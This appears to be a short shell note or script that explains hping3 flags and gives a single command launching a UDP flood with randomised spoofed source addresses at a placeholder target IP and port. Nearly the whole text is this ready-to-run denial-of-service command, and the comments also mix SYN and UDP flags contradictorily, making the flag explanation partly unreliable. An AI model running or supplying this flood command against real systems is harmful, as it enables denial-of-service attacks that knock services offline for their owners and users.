# UDP flood
#   -S: specifies SYN packets.
#   –flood: shoot at discretion, replies will be ignored (that’s why replies wont be shown) and packets will be sent fast as possible.
#   –rand-source: random source address
#   –udp: UDP mode
#   -V: Verbosity.
#   -p –destport: destination port (default 0)

# whew we can get examples: https://linuxhint.com/hping3/

hping3 -S --flood -V --rand-source --udp -p ${TARGET_PORT} ${TARGET_IP}